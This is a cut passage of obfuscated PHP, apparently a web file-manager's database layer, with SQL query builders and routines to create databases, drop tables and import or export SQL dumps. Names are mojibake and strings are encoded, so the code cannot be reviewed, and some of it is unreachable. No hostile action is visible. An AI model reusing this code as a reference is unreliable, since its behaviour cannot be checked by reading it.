$ò€¶½úÏ[22]; } protected function parseComment($¸Ã®²›·) { $¦¬–Ò =& $_SERVER[Õò”†—·]; return !empty($¸Ã®²›·) ? $¦¬–Ò[1085] . $¸Ã®²›· . $¦¬–Ò[1086] : $¦¬–Ò[22]; } protected function parseDistinct($Ìáè–º) { $É£“àæƒ =& $_SERVER[Õò”†—·]; return !empty($Ìáè–º) ? $É£“àæƒ[1087] : $É£“àæƒ[22]; } protected function parseUnion($Ñ’‹¢‡) { $µûĞÓÃ =& $_SERVER[Õò”†—·]; if (empty($Ñ’‹¢‡)) { return $µûĞÓÃ[22]; } if (isset($Ñ’‹¢‡[$µûĞÓÃ[408]])) { $õª°ğÔ… = $µûĞÓÃ[1088]; unset($Ñ’‹¢‡[$µûĞÓÃ[408]]); } else { $õª°ğÔ… = $µûĞÓÃ[1089]; } foreach ($Ñ’‹¢‡ as $ŠíĞ¾) { $ôÇ‘•Ğ›[] = $õª°ğÔ… . (is_array($ŠíĞ¾) ? $this->buildSelectSql($ŠíĞ¾) : $ŠíĞ¾); } return implode($µûĞÓÃ[63], $ôÇ‘•Ğ›); } public function insert($õ¡á…Œ, $Ùİ‚ÒÅÂ = array(), $áû´ø‰„ = false) { $İ‡èé“ò =& $_SERVER[Õò”†—·]; $´Û´¥ = $Ùµï´íë = array(); $this->model = $Ùİ‚ÒÅÂ[$İ‡èé“ò[342]]; foreach ($õ¡á…Œ as $„ùë“¼€ => $ĞŒóĞçÅ) { if (is_array($ĞŒóĞçÅ) && $İ‡èé“ò[357] == $ĞŒóĞçÅ[0]) { $Ùµï´íë[] = $this->parseKey($„ùë“¼€); $´Û´¥[] = $ĞŒóĞçÅ[1]; } elseif (is_scalar($ĞŒóĞçÅ) || is_null($ĞŒóĞçÅ)) { $Ùµï´íë[] = $this->parseKey($„ùë“¼€); $´Û´¥[] = $this->parseValue($ĞŒóĞçÅ); } } $ùèğ¢ç = ($áû´ø‰„ ? $İ‡èé“ò[957] : $İ‡èé“ò[958]) . $İ‡èé“ò[959] . $this->parseTable($Ùİ‚ÒÅÂ[$İ‡èé“ò[340]]) . $İ‡èé“ò[953] . implode($İ‡èé“ò[60], $Ùµï´íë) . $İ‡èé“ò[954] . implode($İ‡èé“ò[60], $´Û´¥) . $İ‡èé“ò[955]; $ùèğ¢ç .= $this->parseLock(isset($Ùİ‚ÒÅÂ[$İ‡èé“ò[894]]) ? $Ùİ‚ÒÅÂ[$İ‡èé“ò[894]] : !1); $ùèğ¢ç .= $this->parseComment(!empty($Ùİ‚ÒÅÂ[$İ‡èé“ò[414]]) ? $Ùİ‚ÒÅÂ[$İ‡èé“ò[414]] : $İ‡èé“ò[22]); return $this->execute($ùèğ¢ç, $this->parseBind(!empty($Ùİ‚ÒÅÂ[$İ‡èé“ò[345]]) ? $Ùİ‚ÒÅÂ[$İ‡èé“ò[345]] : array())); } public function selectInsert($½ÈÕ‡ã¦, $ƒ†¥•ƒŒ, $„ÖôÁˆˆ = array()) { $’ßìƒ =& $_SERVER[Õò”†—·]; $this->model = $„ÖôÁˆˆ[$’ßìƒ[342]]; if (is_string($½ÈÕ‡ã¦)) { $½ÈÕ‡ã¦ = explode($’ßìƒ[60], $½ÈÕ‡ã¦); } array_walk($½ÈÕ‡ã¦, array($this, $’ßìƒ[956])); $Â¤’­™ = $’ßìƒ[1090] . $this->parseTable($ƒ†¥•ƒŒ) . $’ßìƒ[953] . implode($’ßìƒ[60], $½ÈÕ‡ã¦) . $’ßìƒ[1068]; $Â¤’­™ .= $this->buildSelectSql($„ÖôÁˆˆ); return $this->execute($Â¤’­™, $this->parseBind(!empty($„ÖôÁˆˆ[$’ßìƒ[345]]) ? $„ÖôÁˆˆ[$’ßìƒ[345]] : array())); } public function update($Ñ‹¾ô¯î, $¸ÃÇ‰çŞ) { $½ˆİšè˜ =& $_SERVER[Õò”†—·]; $this->model = $¸ÃÇ‰çŞ[$½ˆİšè˜[342]]; $ÇâªòÕå = $½ˆİšè˜[1091] . $this->parseTable($¸ÃÇ‰çŞ[$½ˆİšè˜[340]]) . $this->parseSet($Ñ‹¾ô¯î) . $this->parseWhere(!empty($¸ÃÇ‰çŞ[$½ˆİšè˜[336]]) ? $¸ÃÇ‰çŞ[$½ˆİšè˜[336]] : $½ˆİšè˜[22]) . $this->parseOrder(!empty($¸ÃÇ‰çŞ[$½ˆİšè˜[425]]) ? $¸ÃÇ‰çŞ[$½ˆİšè˜[425]] : $½ˆİšè˜[22]) . $this->parseLimit(!empty($¸ÃÇ‰çŞ[$½ˆİšè˜[352]]) ? $¸ÃÇ‰çŞ[$½ˆİšè˜[352]] : $½ˆİšè˜[22]) . $this->parseLock(isset($¸ÃÇ‰çŞ[$½ˆİšè˜[894]]) ? $¸ÃÇ‰çŞ[$½ˆİšè˜[894]] : !1) . $this->parseComment(!empty($¸ÃÇ‰çŞ[$½ˆİšè˜[414]]) ? $¸ÃÇ‰çŞ[$½ˆİšè˜[414]] : $½ˆİšè˜[22]); return $this->execute($ÇâªòÕå, $this->parseBind(!empty($¸ÃÇ‰çŞ[$½ˆİšè˜[345]]) ? $¸ÃÇ‰çŞ[$½ˆİšè˜[345]] : array())); } public function delete($Í¡û¬ü´ = array()) { $½ˆóÎØ£ =& $_SERVER[Õò”†—·]; $this->model = $Í¡û¬ü´[$½ˆóÎØ£[342]]; $Ø´É¢„ò = $½ˆóÎØ£[1092] . $this->parseTable($Í¡û¬ü´[$½ˆóÎØ£[340]]) . $this->parseWhere(!empty($Í¡û¬ü´[$½ˆóÎØ£[336]]) ? $Í¡û¬ü´[$½ˆóÎØ£[336]] : $½ˆóÎØ£[22]) . $this->parseOrder(!empty($Í¡û¬ü´[$½ˆóÎØ£[425]]) ? $Í¡û¬ü´[$½ˆóÎØ£[425]] : $½ˆóÎØ£[22]) . $this->parseLimit(!empty($Í¡û¬ü´[$½ˆóÎØ£[352]]) ? $Í¡û¬ü´[$½ˆóÎØ£[352]] : $½ˆóÎØ£[22]) . $this->parseLock(isset($Í¡û¬ü´[$½ˆóÎØ£[894]]) ? $Í¡û¬ü´[$½ˆóÎØ£[894]] : !1) . $this->parseComment(!empty($Í¡û¬ü´[$½ˆóÎØ£[414]]) ? $Í¡û¬ü´[$½ˆóÎØ£[414]] : $½ˆóÎØ£[22]); return $this->execute($Ø´É¢„ò, $this->parseBind(!empty($Í¡û¬ü´[$½ˆóÎØ£[345]]) ? $Í¡û¬ü´[$½ˆóÎØ£[345]] : array())); } public function select($í¤ØÎŞé = array()) { $Ğ©“ŞŒ =& $_SERVER[Õò”†—·]; $this->model = $í¤ØÎŞé[$Ğ©“ŞŒ[342]]; $×“…Ò£ = $this->buildSelectSql($í¤ØÎŞé); $›ŸøİÖİ = isset($í¤ØÎŞé[$Ğ©“ŞŒ[409]]) ? $í¤ØÎŞé[$Ğ©“ŞŒ[409]] : !1; if ($›ŸøİÖİ) { $ÀŒš¾¦Á = is_string($›ŸøİÖİ[$Ğ©“ŞŒ[107]]) ? $›ŸøİÖİ[$Ğ©“ŞŒ[107]] : $Ğ©“ŞŒ[1093] . md5($×“…Ò£); $ğ±˜â”ò = think_cache($ÀŒš¾¦Á, $Ğ©“ŞŒ[22], $›ŸøİÖİ); if (!1 !== $ğ±˜â”ò) { return $ğ±˜â”ò; } } $İÉõ“¤ = $this->query($×“…Ò£, $this->parseBind(!empty($í¤ØÎŞé[$Ğ©“ŞŒ[345]]) ? $í¤ØÎŞé[$Ğ©“ŞŒ[345]] : array())); if ($›ŸøİÖİ && !1 !== $İÉõ“¤) { think_cache($ÀŒš¾¦Á, $İÉõ“¤, $›ŸøİÖİ); } return $İÉõ“¤; } public function buildSelectSql($Ü¸Ø›Ü… = array()) { $İŠª™• =& $_SERVER[Õò”†—·]; if (isset($Ü¸Ø›Ü…[$İŠª™•[413]])) { if (strpos($Ü¸Ø›Ü…[$İŠª™•[413]], $İŠª™•[60])) { list($‚š÷²ã®, $Ş¦¼ôî) = explode($İŠª™•[60], $Ü¸Ø›Ü…[$İŠª™•[413]]); } else { $‚š÷²ã® = $Ü¸Ø›Ü…[$İŠª™•[413]]; } $‚š÷²ã® = $‚š÷²ã® ? $‚š÷²ã® : 1; $Ş¦¼ôî = isset($Ş¦¼ôî) ? $Ş¦¼ôî : (is_numeric($Ü¸Ø›Ü…[$İŠª™•[352]]) ? $Ü¸Ø›Ü…[$İŠª™•[352]] : 20); $‹·²Äğß = $Ş¦¼ôî * ((int) $‚š÷²ã® - 1); $Ü¸Ø›Ü…[$İŠª™•[352]] = $‹·²Äğß . $İŠª™•[60] . $Ş¦¼ôî; } if (think_config($İŠª™•[1094])) { $âÑ´¶®³ = $İŠª™•[1095] . md5(serialize($Ü¸Ø›Ü…)); $“ÓÒõ¿š = think_cache($âÑ´¶®³); if ($“ÓÒõ¿š) { return $“ÓÒõ¿š; } } $Áİ“êÉÓ = $this->parseSql($this->selectSql, $Ü¸Ø›Ü…); $Áİ“êÉÓ .= $this->parseLock(isset($Ü¸Ø›Ü…[$İŠª™•[894]]) ? $Ü¸Ø›Ü…[$İŠª™•[894]] : !1); if (isset($âÑ´¶®³)) { think_cache($âÑ´¶®³, $Áİ“êÉÓ); } return $Áİ“êÉÓ; } public function parseSql($¨±ÂÀ·, $å­Î‡ı = array()) { $ª¾¤Õé· =& $_SERVER[Õò”†—·]; $¨±ÂÀ· = str_replace(array($ª¾¤Õé·[1096], $ª¾¤Õé·[1097], $ª¾¤Õé·[1098], $ª¾¤Õé·[1099], $ª¾¤Õé·[1100], $ª¾¤Õé·[1101], $ª¾¤Õé·[1102], $ª¾¤Õé·[1103], $ª¾¤Õé·[1104], $ª¾¤Õé·[1105], $ª¾¤Õé·[1106]), array($this->parseTable("{$å­Î‡ı[$ª¾¤Õé·[340]]}"), $this->parseDistinct(isset($å­Î‡ı[$ª¾¤Õé·[1107]]) ? $å­Î‡ı[$ª¾¤Õé·[1107]] : !1), $this->parseField(!empty($å­Î‡ı[$ª¾¤Õé·[334]]) ? $å­Î‡ı[$ª¾¤Õé·[334]] : $ª¾¤Õé·[221]), $this->parseJoin(!empty($å­Î‡ı[$ª¾¤Õé·[343]]) ? $å­Î‡ı[$ª¾¤Õé·[343]] : $ª¾¤Õé·[22]), $this->parseWhere(!empty($å­Î‡ı[$ª¾¤Õé·[336]]) ? $å­Î‡ı[$ª¾¤Õé·[336]] : $ª¾¤Õé·[22]), $this->parseGroup(!empty($å­Î‡ı[$ª¾¤Õé·[563]]) ? $å­Î‡ı[$ª¾¤Õé·[563]] : $ª¾¤Õé·[22]), $this->parseHaving(!empty($å­Î‡ı[$ª¾¤Õé·[1108]]) ? $å­Î‡ı[$ª¾¤Õé·[1108]] : $ª¾¤Õé·[22]), $this->parseOrder(!empty($å­Î‡ı[$ª¾¤Õé·[425]]) ? $å­Î‡ı[$ª¾¤Õé·[425]] : $ª¾¤Õé·[22]), $this->parseLimit(!empty($å­Î‡ı[$ª¾¤Õé·[352]]) ? $å­Î‡ı[$ª¾¤Õé·[352]] : $ª¾¤Õé·[22]), $this->parseUnion(!empty($å­Î‡ı[$ª¾¤Õé·[407]]) ? $å­Î‡ı[$ª¾¤Õé·[407]] : $ª¾¤Õé·[22]), $this->parseComment(!empty($å­Î‡ı[$ª¾¤Õé·[414]]) ? $å­Î‡ı[$ª¾¤Õé·[414]] : $ª¾¤Õé·[22])), $¨±ÂÀ·); return $¨±ÂÀ·; } public function getLastSql($ÊÖøƒ ì = '') { return $ÊÖøƒ ì ? $this->modelSql[$ÊÖøƒ ì] : $this->queryStr; } public function getLastInsID() { return $this->lastInsID; } public function getError() { return $this->error; } public function escapeString($çá¸©±) { return addslashes($çá¸©±); } public function setModel($Ï˜É¬©Ã) { $this->model = $Ï˜É¬©Ã; } public function getDbType() { return $this->dbType; } public function __destruct() { if ($this->queryID) { $this->free(); } $this->close(); } public function close() { } } class DbManage { function __construct($¹¯§‡È = array()) { $Ñä×Ú¤© =& $_SERVER[Õò”†—·]; if (empty($¹¯§‡È)) { $¹¯§‡È = $GLOBALS[$Ñä×Ú¤©[16]][$Ñä×Ú¤©[31]]; } $this->database = $¹¯§‡È; } public function model($„³•ÄÅÓ = '') { return new ModelBase($„³•ÄÅÓ, $_SERVER[Õò”†—·][22], $this->database); } public function db($ÁöÎ÷à½ = false) { $Ë¦ìŸŒ =& $_SERVER[Õò”†—·]; $‚É‚Àµ = array_change_key_case($this->database); if ($this->dbType() == $Ë¦ìŸŒ[23] || !$ÁöÎ÷à½) { return $this->model()->db(); } $‚¤»¹´Õ = $‚É‚Àµ[$Ë¦ìŸŒ[1022]]; $‚É‚Àµ[$Ë¦ìŸŒ[1022]] = $Ë¦ìŸŒ[22]; if ($‚É‚Àµ[$Ë¦ìŸŒ[1017]] == $Ë¦ìŸŒ[1014]) { $¯®”ßÆ® = $‚É‚Àµ[$Ë¦ìŸŒ[1023]]; $‚É‚Àµ[$Ë¦ìŸŒ[1023]] = substr($¯®”ßÆ®, 0, strrpos($¯®”ßÆ®, $Ë¦ìŸŒ[1109])); } $this->database = $‚É‚Àµ; $ô–‡†‹¬ = $this->model()->db(); try { $×ÂÖñŠˆ = $ô–‡†‹¬->execute("\163\150\157\167\x20\144\x61\164\x61\x62\x61\x73\x65\163\40\x6c\151\153\145\x20\x27{$‚¤»¹´Õ}\47"); } catch (Exception $¦…¢ıšÚ) { } if (!$×ÂÖñŠˆ) { $ô–‡†‹¬->execute("\143\x72\x65\x61\x74\x65\x20\x64\x61\x74\x61\x62\141\x73\145\x20\x60{$‚¤»¹´Õ}\x60"); } $‚É‚Àµ[$Ë¦ìŸŒ[1022]] = $‚¤»¹´Õ; if ($‚É‚Àµ[$Ë¦ìŸŒ[1017]] == $Ë¦ìŸŒ[1014]) { $‚É‚Àµ[$Ë¦ìŸŒ[1023]] .= $Ë¦ìŸŒ[1109] . $‚¤»¹´Õ; } $this->database = $‚É‚Àµ; $ô–‡†‹¬->execute("\x75\163\145\40\140{$‚¤»¹´Õ}\x60"); return $ô–‡†‹¬; } public function createTable($Ï• µ®õ, &$óøü¢Ë‰) { $ïó¼ı™ =& $_SERVER[Õò”†—·]; if (!IO::exist($Ï• µ®õ)) { ActionCall($ïó¼ı™[1110], !0, 0); show_json(LNG($ïó¼ı™[1111]), !1); } $ Ÿ‹‘¨å = $this->model()->db(); $¼ø›»•ˆ = sqlSplit(IO::getContent($Ï• µ®õ)); foreach ($¼ø›»•ˆ as $İ©„¶‘…) { $Òè¡â²— = stripos($İ©„¶‘…, $ïó¼ı™[1112]) === 0; if ($Òè¡â²—) { $óøü¢Ë‰->task[$ïó¼ı™[1113]] += 1; } $ Ÿ‹‘¨å->execute($İ©„¶‘…); if ($Òè¡â²—) { preg_match($ïó¼ı™[1114], $İ©„¶‘…, $ª™ãà“ ); $óøü¢Ë‰->task[$ïó¼ı™[1115]] = $ª™ãà“ [1]; $óøü¢Ë‰->update(1); } } } public function insertTable($›™‘İ÷Ú, &$˜ªŒÁğ) { $ß±™ÉÃÛ =& $_SERVER[Õò”†—·]; $À·¹ı¦É = $this->model()->db(); $âğÔ³ ô = $ÆÊøöâÈ ? array($ÆÊøöâÈ) : $À·¹ı¦É->getTables(); foreach ($›™‘İ÷Ú as $Ü†¾«‚Õ) { $ÆÊøöâÈ = basename($Ü†¾«‚Õ, $ß±™ÉÃÛ[838]); if (!in_array($ÆÊøöâÈ, $âğÔ³ ô)) { continue; } $˜ªŒÁğ->task[$ß±™ÉÃÛ[1115]] = $ÆÊøöâÈ; if (get_filesize($Ü†¾«‚Õ) == 0) { continue; } $Í“Ş™ = $this->sqlToDb($Ü†¾«‚Õ, $˜ªŒÁğ); if (!$Í“Ş™) { ActionCall($ß±™ÉÃÛ[1110], !0, 0); show_json(LNG($ß±™ÉÃÛ[1116]) . "\x5b{$ÆÊøöâÈ}\x5d", !1); } } } public function sqlFromDb($ÈÚÓ¦¯®, $˜¬™–Ì, &$Í–ß¸¦, $ò²¬åßø = '') { if ($Í–ß¸¦) { $Í–ß¸¦->task[$_SERVER[Õò”†—·][1115]] = $ÈÚÓ¦¯®; } $±©—¥Ä = $this->model($ÈÚÓ¦¯®); $¢‹””ÀĞ = 0; $˜ÛŞŞ’œ = 0; $ÂıèÅ“ö = 10000; $ñÔÊ •» = fopen($˜¬™–Ì, $_SERVER[Õò”†—·][1117]); $¢ªƒ„í† = $±©—¥Ä->getPk(); $½ ¶Á¥ = $±©—¥Ä->getDbFields(); $Ä¸…Âà = $_SERVER[Õò”†—·][22]; if ($GLOBALS[$_SERVER[Õò”†—·][837]] && in_array($ÈÚÓ¦¯®, array($_SERVER[Õò”†—·][1118], $_SERVER[Õò”†—·][1119]))) { $Ä¸…Âà = $ÈÚÓ¦¯®; } do { $ë²ƒò•ì = array($¢ªƒ„í† => array($_SERVER[Õò”†—·][1064], $˜ÛŞŞ’œ)); $—ğ°Îú¼ = $±©—¥Ä->where($ë²ƒò•ì)->field($½ ¶Á¥)->order($¢ªƒ„í† . $_SERVER[Õò”†—·][1120])->limit($ÂıèÅ“ö)->select(); $—ğ°Îú¼ = !empty($—ğ°Îú¼) ? $—ğ°Îú¼ : array(); if (!($Ü“‹‰œá = count($—ğ°Îú¼))) { break; } $š…ßÇ¾ = end($—ğ°Îú¼); $˜ÛŞŞ’œ = $š…ßÇ¾[$¢ªƒ„í†]; $ºçÇÙæ« = array(); foreach ($—ğ°Îú¼ as $ÕÚË¬Š¯) { if ($Ä¸…Âà) { if ($ÈÚÓ¦¯® == $_SERVER[Õò”†—·][1118]) { if ($ÕÚË¬Š¯[$_SERVER[Õò”†—·][43]] == $_SERVER[Õò”†—·][1121]) { $ƒ‚Ë‘´ = json_decode($ÕÚË¬Š¯[$_SERVER[Õò”†—·][434]], !0); if ($ƒ‚Ë‘´[$_SERVER[Õò”†—·][42]] == $GLOBALS[$_SERVER[Õò”†—·][837]] && $ƒ‚Ë‘´[$_SERVER[Õò”†—·][801]] != 1) { continue; } } } else { if ($ÕÚË¬Š¯[$_SERVER[Õò”†—·][43]] == $_SERVER[Õò”†—·][1122] && $ÕÚË¬Š¯[$_SERVER[Õò”†—·][107]] == $_SERVER[Õò”†—·][832]) { continue; } } } if ($ò²¬åßø) { $ÕÚË¬Š¯[$_SERVER[Õò”†—·][97]] = "\x7b\x69\x6f\72{$ò²¬åßø}\175" . substr($ÕÚË¬Š¯[$_SERVER[Õò”†—·][97]], strlen("\173\x69\157\72{$ÕÚË¬Š¯[$_SERVER[Õò”†—·][867]]}\175")); $ÕÚË¬Š¯[$_SERVER[Õò”†—·][867]] = $ò²¬åßø; } $ºçÇÙæ«[] = $_SERVER[Õò”†—·][1123] . $this->sqlEncode($ÕÚË¬Š¯) . $_SERVER[Õò”†—·][1124]; } $×¨÷¾­¹ = "\111\116\x53\105\122\x54\40\x49\x4e\124\x4f\x20\x60{$ÈÚÓ¦¯®}\x60\x20\50\x60" . implode($_SERVER[Õò”†—·][1125], $½ ¶Á¥) . $_SERVER[Õò”†—·][1126]; fwrite($ñÔÊ •», $×¨÷¾­¹ . implode($_SERVER[Õò”†—·][1127], $ºçÇÙæ«) . $_SERVER[Õò”†—·][84] . PHP_EOL); $¢‹””ÀĞ += $Ü“‹‰œá; if ($Í–ß¸¦) { $Í–ß¸¦->update($Ü“‹‰œá); } } while ($ÂıèÅ“ö == $Ü“‹‰œá); fclose($ñÔÊ •»); return $¢‹””ÀĞ; } public function sqlToDb($²­×Õ¬ª, &$Ö‰ã™Ã„) { $–ÛÙ¡Ç =& $_SERVER[Õò”†—·]; $‡Ã÷ª±• = $this->model()->db(); $ôÀ‘Ñ = @fopen($²­×Õ¬ª, $–ÛÙ¡Ç[1128]); if (!$ôÀ‘Ñ) { return !1; } $ÇèèÍ¡£ = 0; $šò™Ã‹‡ = $–ÛÙ¡Ç[22]; $œ¡•‘Óí = array(); $ğøŸÔè¢ = $this->dbType(); $ÆÌö–İ– = $ğøŸÔè¢ == $–ÛÙ¡Ç[23] ? 500 : 2000; $ÄÑû¾Á¦ = basename($²­×Õ¬ª, $–ÛÙ¡Ç[838]); $¦“’ Â = 0; $»¨ÕèÕ = 4194304; while (!feof($ôÀ‘Ñ)) { $üçÊÙ† = trim(fgets($ôÀ‘Ñ)); if (!$üçÊÙ†) { continue; } $æåŠ²†è = $this->sqlDecode($üçÊÙ†, $ğøŸÔè¢, $ÄÑû¾Á¦); if (stripos($æåŠ²†è, $–ÛÙ¡Ç[415]) === 0) { if (!$šò™Ã‹‡) { $šò™Ã‹‡ = $æåŠ²†è . $–ÛÙ¡Ç[63]; } continue; } if ($Ö‰ã™Ã„) { $Ö‰ã™Ã„->task[$–ÛÙ¡Ç[1113]] += 1; } $ÇèèÍ¡£++; $œ¡•‘Óí[] = rtrim(rtrim(trim($æåŠ²†è), $–ÛÙ¡Ç[60]), $–ÛÙ¡Ç[84]); $®ÃÕ‰²à = null; $çó‡Ú = strlen($æåŠ²†è); $¦“’ Â += $çó‡Ú; $÷€øôÔÜ = strlen($šò™Ã‹‡) + $¦“’ Â + (count($œ¡•‘Óí) - 1); if ($÷€øôÔÜ >= $»¨ÕèÕ) { $®ÃÕ‰²à = array_pop($œ¡•‘Óí); if ($ÇèèÍ¡£ > 1) { $ÇèèÍ¡£--; } } if ($ÇèèÍ¡£ >= $ÆÌö–İ– || $®ÃÕ‰²à) { $æåŠ²†è = $šò™Ã‹‡ . implode($–ÛÙ¡Ç[60], $œ¡•‘Óí); if (!$‡Ã÷ª±•->execute($æåŠ²†è)) { return !1; } if ($Ö‰ã™Ã„) { $Ö‰ã™Ã„->update($ÇèèÍ¡£); } $œ¡•‘Óí = array(); $ÇèèÍ¡£ = 0; $¦“’ Â = 0; if ($®ÃÕ‰²à) { $œ¡•‘Óí = array($®ÃÕ‰²à); $ÇèèÍ¡£ = 1; $¦“’ Â = $çó‡Ú; } } } fclose($ôÀ‘Ñ); if (!empty($œ¡•‘Óí)) { $æåŠ²†è = $šò™Ã‹‡ . implode($–ÛÙ¡Ç[60], $œ¡•‘Óí); if (!$‡Ã÷ª±•->execute($æåŠ²†è)) { return !1; } if ($Ö‰ã™Ã„) { $Ö‰ã™Ã„->update($ÇèèÍ¡£); } } return !0; } public function dropTable($²§•˜Š¦ = null) { $ˆ¿€ãÆÈ = $this->model()->db(); $ÂÖåš­Á = $²§•˜Š¦ ? array($²§•˜Š¦) : $ˆ¿€ãÆÈ->getTables(); if (!$ÂÖåš­Á) { return; } foreach ($ÂÖåš­Á as $²§•˜Š¦) { if ($²§•˜Š¦) { $²§•˜Š¦ = strtolower($²§•˜Š¦); } else { continue; } $ˆ¿€ãÆÈ->execute("\x64\x72\x6f\x70\40\x74\x61\142\154\145\x20\x69\x66\40\145\x78\151\163\164\x73\x20\x60{$²§•˜Š¦}\x60"); } } private function sqlEncode($®û¸‚‚Ø) { $ßÉÌ·£ =& $_SERVER[Õò”†—·]; $µµ¦¨¥æ = array(); foreach ($®û¸‚‚Ø as $¾ŠÖ‚ßš) { if (is_array($¾ŠÖ‚ßš)) { $¾ŠÖ‚ßš = json_encode_force($¾ŠÖ‚ßš); } $¾ŠÖ‚ßš = addslashes($¾ŠÖ‚ßš); $¾ŠÖ‚ßš = str_replace(array($ßÉÌ·£[1129], $ßÉÌ·£[12], $ßÉÌ·£[402]), array($ßÉÌ·£[1130], $ßÉÌ·£[1131], $ßÉÌ·£[1132]), $¾ŠÖ‚ßš); $µµ¦¨¥æ[] = $¾ŠÖ‚ßš; } return $ßÉÌ·£[68] . implode($ßÉÌ·£[1133], $µµ¦¨¥æ) . $ßÉÌ·£[68]; } private function sqlDecode($ â·–ù, $âÅÆÂî, $ª¨˜ù´’ = '') { $Âê³®·÷ =& $_SERVER[Õò”†—·]; $ â·–ù = str_replace(array($Âê³®·÷[1130], $Âê³®·÷[1131], $Âê³®·÷[1132]), array($Âê³®·÷[1129], $Âê³®·÷[12], $Âê³®·÷[402]), $ â·–ù); if ($âÅÆÂî == $Âê³®·÷[23]) { $ â·–ù = str_ireplace($Âê³®·÷[1134], $Âê³®·÷[69], $ â·–ù); $ â·–ù = stripslashes($ â·–ù); } return preg_replace($Âê³®·÷[1135], $Âê³®·÷[22], $ â·–ù); if ($âÅÆÂî == $Âê³®·÷[23]) { return $ª¨˜ù´’ != $Âê³®·÷[1136] ? stripslashes($ â·–ù) : $ â·–ù; } if ($ª¨˜ù´’ == $Âê³®·÷[1136]) { $ â·–ù = str_replace($Âê³®·÷[1137], $Âê³®·÷[131], stripslashes($ â·–ù)); } return $ â·–ù; } public function getSqlFile($è¬â«· = '') { $Ëäé©¦Û =& $_SERVER[Õò”†—·]; $û£Ü©¿ê = $this->dbType(!0); $ÜòâìØÙ = CONTROLLER_DIR . "\x69\x6e\163\x74\141\154\154\57\144\141\164\141\x2f{$û£Ü©¿ê}\x2e\163\161\154"; $Äú™Æéí = file_get_contents($ÜòâìØÙ); $–Ì©©¼å = $Ëäé©¦Û[1138] . ($û£Ü©¿ê == $Ëäé©¦Û[854] ? $Ëäé©¦Û[1139] : $Ëäé©¦Û[1140]) . $Ëäé©¦Û[1141]; preg_match_all($–Ì©©¼å, $Äú™Æéí, $¸¶§Íëé); $Ì×§¯ñ’ = $¸¶§Íëé[1]; $ãğÜš–… = $this->model()->db(); $™ĞÇ‡¢Ô = $ãğÜš–…->getTables(); $Œ˜øşü» = TEMP_FILES . $Ëäé©¦Û[1142] . date($Ëäé©¦Û[272]) . $Ëäé©¦Û[18]; del_dir($Œ˜øşü»); mk_dir($Œ˜øşü»); $Œ„–Ôˆ² = $Œ˜øşü» . $Ëäé©¦Û[1143]; $ÚÁƒ¹¥ª = $Œ˜øşü» . $Ëäé©¦Û[1144]; $‘Ô£İ« = $û£Ü©¿ê == $Ëäé©¦Û[23] ? $Ëäé©¦Û[854] : $Ëäé©¦Û[23]; IO::copy(CONTROLLER_DIR . "\151\x6e\163\164\141\154\x6c\57\x64\x61\164\x61\57{$‘Ô£İ«}\56\x73\161\154", $Œ˜øşü»); @touch($Œ˜øşü» . $û£Ü©¿ê . $Ëäé©¦Û[838]); $ÄíÂÃÙ = fopen($Œ„–Ôˆ², $Ëäé©¦Û[1117]); $ıæ¼×— = fopen($ÚÁƒ¹¥ª, $Ëäé©¦Û[1117]); if ($û£Ü©¿ê == $Ëäé©¦Û[23]) { $™ĞÇ‡¢Ô = array_diff($™ĞÇ‡¢Ô, array($Ëäé©¦Û[830], $Ëäé©¦Û[831])); $¯³¤Ë€§ = array($Ëäé©¦Û[1145], $Ëäé©¦Û[1146], $Ëäé©¦Û[1147]); fwrite($ıæ¼×—, implode(PHP_EOL, $¯³¤Ë€§) . PHP_EOL . PHP_EOL); foreach ($™ĞÇ‡¢Ô as $¤ğ«±êğ) { $Ò­±á²Ó = $this->sqlFromSqlite($¤ğ«±êğ); if (!$Ò­±á²Ó[$Ëäé©¦Û[23]]) { continue; } fwrite($ıæ¼×—, $Ò­±á²Ó[$Ëäé©¦Û[23]] . PHP_EOL . PHP_EOL); if (!in_array($¤ğ«±êğ, $Ì×§¯ñ’)) { fwrite($ÄíÂÃÙ, $Ò­±á²Ó[$Ëäé©¦Û[854]] . PHP_EOL . PHP_EOL); } } } else { foreach ($™ĞÇ‡¢Ô as $¤ğ«±êğ) { $Ò­±á²Ó = $this->sqlFromMysql($¤ğ«±êğ); if (!$Ò­±á²Ó[$Ëäé©¦Û[854]]) { continue; } fwrite($ÄíÂÃÙ, $Ò­±á²Ó[$Ëäé©¦Û[854]] . PHP_EOL . PHP_EOL); if (!in_array($¤ğ«±êğ, $Ì×§¯ñ’)) { fwrite($ıæ¼×—, $Ò­±á²Ó[$Ëäé©¦Û[23]] . PHP_EOL . PHP_EOL); } } } fclose($ÄíÂÃÙ); fclose($ıæ¼×—); $Äú™Æéí = array($Ëäé©¦Û[854] => $Œ„–Ôˆ², $Ëäé©¦Û[23] => $ÚÁƒ¹¥ª); return $è¬â«· ? $Äú™Æéí[$è¬â«·] : $Äú™Æéí; } public function dbType($Šº´öƒˆ = false) { $’ñêşç =& $_SERVER[Õò”†—·]; $•«¥ïØø = $Šº´öƒˆ ? $GLOBALS[$’ñêşç[16]][$’ñêşç[31]] : $this->database; $•«¥ïØø = array_change_key_case($•«¥ïØø); $¾ß÷Äã° = $•«¥ïØø[$’ñêşç[1017]]; if ($¾ß÷Äã° == $’ñêşç[1014]) { $ÃÍüËİõ = explode($’ñêşç[4], $•«¥ïØø[$’ñêşç[1023]]); $¾ß÷Äã° = $ÃÍüËİõ[0]; } $¦±¥×ÅÄ = array($’ñêşç[1148] => $’ñêşç[23], $’ñêşç[962] => $’ñêşç[854]); if (isset($¦±¥×ÅÄ[$¾ß÷Äã°])) { $¾ß÷Äã° = $¦±¥×ÅÄ[$¾ß÷Äã°]; } return $¾ß÷Äã°; } public function sqlFromMysql($–˜øëà , $ÍÙÂ»óÎ = '') { $‚“Àş¢Ô =& $_SERVER[Õò”†—·]; $ôşİã‰Ã = $this->model()->db(); $‹ªıäåë = $ôşİã‰Ã->query($‚“Àş¢Ô[1149] . $–˜øëà  . $‚“Àş¢Ô[445]); if (!$‹ªıäåë || !$‹ªıäåë[0]) { return !1; } $ÏŠÆæğ¤ = _get($‹ªıäåë[0], $‚“Àş¢Ô[1150], $‚“Àş¢Ô[22]); if (!$ÏŠÆæğ¤) { return !1; } $Ààü«Ìë = "\x44\122\x4f\x50\40\124\x41\102\x4c\105\x20\111\106\40\105\x58\111\x53\x54\123\40\140{$–˜øëà }\x60\x3b" . PHP_EOL . $ÏŠÆæğ¤ . $‚“Àş¢Ô[84]; if ($ÍÙÂ»óÎ && $ÍÙÂ»óÎ == $‚“Àş¢Ô[854]) { return $Ààü«Ìë; } $İ•ç…ì = 